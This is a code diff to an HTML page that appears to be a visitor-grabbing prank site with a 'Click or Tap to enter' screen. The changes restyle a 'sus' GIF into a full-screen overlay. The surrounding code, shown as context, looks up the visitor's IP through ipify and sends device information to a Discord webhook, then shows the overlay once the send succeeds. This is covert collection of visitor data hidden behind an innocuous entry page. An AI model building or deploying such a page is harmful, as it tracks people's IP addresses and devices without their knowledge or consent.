@@ -6,32 +6,47 @@
     body {
       font-family: Arial, sans-serif;
       display: flex;
-      flex-direction: column; /* Stack elements vertically */
       justify-content: center;
       align-items: center;
       height: 100vh; /* Full viewport height */
       margin: 0; /* Remove default margin */
       background-color: black; /* Black background */
       color: gray; /* Gray text */
+      overflow: hidden; /* Prevent scrolling */
     }
     #info {
       font-size: 18px;
       text-align: center;
-      margin-top: 20px;
     }
-    #gif {
-      display: none; /* Hide GIF by default */
-      margin-top: 20px;
+    #gif-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: none; /* Hidden by default */
+      justify-content: center;
+      align-items: center;
+      z-index: 9999; /* Ensure it is on top of other content */
+    }
+    #gif-overlay img {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 100vw; /* Full viewport width */
+      height: 100vh; /* Full viewport height */
+      object-fit: cover; /* Cover the entire area */
+      opacity: 0.5; /* Add transparency */
     }
   </style>
 </head>
 <body>
   <h1 id="click-to-enter">Click or Tap to enter...</h1>
   <div id="info"></div>
-  
-  <!-- Hidden image that will be shown on click -->
-  <img id="gif" src="https://media.tenor.com/images/b7c33f80d67f4cc99e2a896a4b5e2573/tenor.gif" alt="GIF">
-
+  <div id="gif-overlay">
+    <img src="https://media.tenor.com/0CNuLxTwEJYAAAAi/sus.gif" alt="Sus GIF">
+  </div>
   <audio id="music" src="https://raw.githubusercontent.com/CosmoGT-dev/CosmoGT-Website/main/Me%20right%20now.mp3" preload="auto"></audio>
   <script>
     // Discord Webhook URL
@@ -45,9 +60,6 @@
 
       // Play music
       document.getElementById('music').play();
-
-      // Show the GIF
-      document.getElementById('gif').style.display = 'block';
 
       // Get user's IP address using IPify API
       fetch('https://api.ipify.org?format=json')
@@ -108,6 +120,9 @@
              .then(response => {
                console.log('Device information sent successfully');
                hasSentInfo = true; // Set the flag to true after sending
+
+               // Show the GIF overlay
+               document.getElementById('gif-overlay').style.display = 'flex';
              })
              .catch(error => console.error('Failed to send device information:', error));
           }, error => {
